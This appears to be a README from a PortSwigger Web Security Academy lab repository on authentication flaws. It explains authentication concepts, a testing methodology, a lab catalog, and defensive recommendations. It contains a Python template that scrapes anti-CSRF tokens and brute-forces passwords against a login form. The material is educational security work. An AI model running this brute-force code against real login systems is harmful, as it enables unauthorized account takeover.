# Authentication Vulnerabilities Laboratory

This repository contains professional-grade documentation, exploitation mechanics, custom automation scripts, and structural remediation strategies compiled during the assessment of the **Authentication** pathway within the PortSwigger Web Security Academy.

---

## Executive Overview
Authentication mechanisms serve as the primary security perimeter for web applications. Flaws within these components consistently rank among the **OWASP Top 10: Broken Authentication / Identification and Authentication Failures**. This laboratory documents real-world validation techniques against broken authentication logic, cryptographic token implementation errors, multi-factor authentication (MFA) bypasses, and state-management weaknesses.

### Authentication Fundamentals & Security Mechanics

This document establishes the underlying core principles, definitions, operational impact, and vulnerability origins of web authentication mechanisms as defined by the PortSwigger Web Security Academy framework.

---

### 1. Core Definitions

#### What is Authentication?
**Authentication is the process of verifying the identity of a user or client.** Web applications are inherently exposed to any entity connected to the internet. Because of this structural open nature, robust authentication mechanisms are an integral requirement to verify identity assertions before granting access to session states.

Authentication systems validate identities using a combination of distinct authentication layers, traditionally categorized into three primary vectors:
*   **Knowledge Factors (Something you know):** Static strings or secrets retrieved from memory (e.g., passwords, passphrases, or answers to security questions).
*   **Possession Factors (Something you have):** Physical objects or unique hardware devices controlled by the client (e.g., mobile phones running authenticator applications, physical security tokens, or hardware keys).
*   **Inherence Factors (Something you are or do):** Biological metrics or distinct patterns of user behavior (e.g., biometrics like fingerprints, facial scans, retina mapping, or behavioral dynamics).

#### Authentication vs. Authorization
A critical distinction must be maintained between identity verification and permission allocation:

| Concept | Functional Objective | Operational Example |
| :--- | :--- | :--- |
| **Authentication** | Verifies *who* a user is. | Verifies that an entity trying to authenticate with the username `Carlos123` is genuinely the specific person who created that account profile. |
| **Authorization** | Verifies *what* an authenticated user is permitted to do. | Once `Carlos123` successfully completes authentication, authorization rules dictate if his session can view other users' records or execute administrative deletions. |

---

### 2. The Origin of Authentication Vulnerabilities

Defects within authentication workflows typically emerge from two structural root causes:

1.  **Weak Anti-Automation Protections:** The underlying authentication mechanism lacks sufficient controls (such as adaptive rate limiting, accounts locks, or captchas) to detect, delay, or systematically block automated brute-force attacks against user credentials.
2.  **Implementation Logic Flaws:** Defective logic models or coding errors in the validation pipeline allow attackers to manipulate execution flows. These logic vulnerabilities frequently allow validation layers to be completely bypassed by an external agent without requiring correct factor inputs (often referred to categorically as **Broken Authentication**).

---

### 3. Vulnerability Impact Analysis

The exploitation of a vulnerable authentication component presents a high risk of complete system compromise. The severity of the blast radius depends on the privilege level of the targeted vector:

#### High-Privileged Account Takeover
If an attacker successfully subverts authentication checks or brute-forces their way into a high-privileged profile (such as a system administrator account), the impact is severe. The attacker gains full structural control over the entire web application deployment, permitting direct access to internal business databases, configuration controls, and interconnected core infrastructure.

#### Low-Privileged Account Takeover
Compromising a standard, low-privileged user account still introduces substantial risk vectors:
*   **Data Leakage:** Grants unauthorized exposure to commercially or personally sensitive user information housed inside that specific account boundary.
*   **Attack Surface Expansion:** Accessing internal application portals exposes additional pages, API endpoints, and business workflows that are restricted from the public web. This provides a broader, authenticated attack surface to hunt for high-severity server-side flaws (e.g., Privilege Escalation, SQLi, or Remote Command Execution).
---

## Testing Methodology & Workflow

Every laboratory target is audited using a standard, reproducible four-stage methodology:

```text
  1. Reconnaissance ──► Mapping parameters, HTTP headers, and error behaviors.
  2. Enumeration   ──► Fuzzing for valid usernames, variations, or response times.
  3. Exploitation  ──► Automating payload execution (Burp Suite / Python Scripts).
  4. Remediation   ──► Documenting programmatic defenses and defensive code snippets.
```

1. **Reconnaissance & Vector Identification:** Intercepting the target workflow (`/login`, `/register`, `/reset`) using Burp Suite Proxy to document session variables, input structures, and defensive measures (e.g., Anti-CSRF tokens).
2. **Enumeration Analysis:** Injecting wordlists into inputs to analyze baseline response messages, status codes, payload lengths, and server processing times.
3. **Exploitation & Takeover:** Utilizing specialized automation to systematically bypass authentication layers, escalate privileges, or simulate account takeover vectors.
4. **Remediation Analysis:** Designing defensive engineering strategies (such as secure parameterization, cryptographically secure token handling, and robust input limits) to resolve the root defects.

---

## Toolkit & Environment Core

The following testing suite was utilized to execute the proof-of-concept attacks documented within this repository:

*   **Proxy / Intercept:** Burp Suite Professional & Community Edition
*   **Fuzzing Engines:** Burp Intruder, `ffuf` (Fast Fuzzing)
*   **Custom Automation:** Python 3.x using the `requests` and `BeautifulSoup4` libraries
*   **Information Assets:** `SecLists` (Usernames, Passwords, and Error Fuzzing payloads)

---

## Track Progress & Lab Catalog

| Lab Identifier | Target Vulnerability / Flaw Class | Severity | Status | Documentation Link |
| :--- | :--- | :--- | :---: | :--- |
| **AUTH-01** | Username Enumeration via Different Responses | Medium | *In Progress* | [View Notes](./labs/AUTH-01.md) |
| **AUTH-02** | 2FA Broken Authentication Bypass | High | *Pending* | [View Notes](./labs/AUTH-02.md) |
| **AUTH-03** | Password Brute Force via Password Change | High | *Pending* | [View Notes](./labs/AUTH-03.md) |
| **AUTH-04** | Authentication Bypass via Response Manipulation | Critical | *Pending* | [View Notes](./labs/AUTH-04.md) |

*Legend:  Completed |  In Progress |  Pending*

---

## Sample Python Exploitation Template

When standard brute-force tools fail due to complex, dynamic application rules (such as per-request rotating anti-CSRF tokens), custom Python automation is deployed. Below is the structural baseline used to handle dynamic login flows:

```python
import requests
from bs4 import BeautifulSoup

class AuthExploiter:
    def __init__(self, target_url):
        self.url = target_url
        self.session = requests.Session() # Manages and persists cookies automatically

    def fetch_csrf_token(self):
        """Extracts dynamic hidden tokens from the target landing page."""
        response = self.session.get(self.url)
        soup = BeautifulSoup(response.text, 'html.parser')
        csrf_input = soup.find('input', {'name': 'csrf'})
        return csrf_input['value'] if csrf_input else None

    def execute_brute_force(self, username, password_list):
        """Iterates through wordlists while maintaining dynamic request states."""
        print(f"[*] Initiating target audit against user: {username}")
        for password in password_list:
            password = password.strip()
            csrf_token = self.fetch_csrf_token()
            
            payload = {
                "username": username,
                "password": password,
                "csrf": csrf_token
            }
            
            response = self.session.post(self.url, data=payload)
            
            # Application success criterion check
            if "My Account" in response.text or response.status_code == 302:
                print(f"[+] SUCCESS: Valid credentials found! -> {username}:{password}")
                return True
        print("[-] Target audit completed. No credentials isolated.")
        return False

if __name__ == "__main__":
    TARGET = "https://web-security-academy.net"
    # Example initialization:
    # exploit = AuthExploiter(TARGET)
    # exploit.execute_brute_force("administrator", ["password", "123456", "admin123"])
```

---

## Strategic Architectural Recommendations

To secure authentication endpoints across production systems globally, engineering teams must maintain the following implementation baselines:

1. **Generic Authentication Messages:** Endpoints must return standardized error statements like `"Invalid username or password"`. The response length, status codes, and HTTP timing profiles must remain indistinguishable regardless of which credential layer was incorrect.
2. **Account Rate Limiting:** Enforce strict, server-side tracking using sliding-window rate limits (e.g., via Redis) bound to both the individual username profile and the source IP address.
3. **Cryptographically Secure State Tracking:** Multi-factor authentication mechanisms must require verification states to be tracked securely server-side or signed via strong cryptographic models (e.g., authenticated JWTs) to avoid response manipulation attacks.

---
*Disclaimer: This repository is built strictly for authorized security research, educational verification, and defensive testing purposes only.*
